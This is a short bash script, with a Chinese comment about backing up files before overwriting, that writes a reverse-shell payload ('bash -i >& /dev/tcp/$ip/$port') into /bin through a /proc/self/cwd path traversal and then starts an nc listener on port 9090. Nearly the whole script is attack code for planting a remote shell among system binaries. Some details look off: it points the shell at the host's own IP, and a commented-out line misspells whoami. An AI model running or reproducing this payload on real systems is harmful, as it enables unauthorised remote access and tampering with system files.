#!/bin/bash
ip=$(hostname -I | awk '{print $1}')
port=9090
# 使用这个的话，要注意文件的重写和覆盖，注意原始文件备份
# cp /usr/bin/whomai /usr/bin/whoami.bak
cat > /proc/self/cwd/../../../bin/bash.copy << EOF
#!/bin/bash
bash -i >& /dev/tcp/$ip/$port 0>&1
EOF

# listen and wait for reverse shell
nc -lvvp 9090
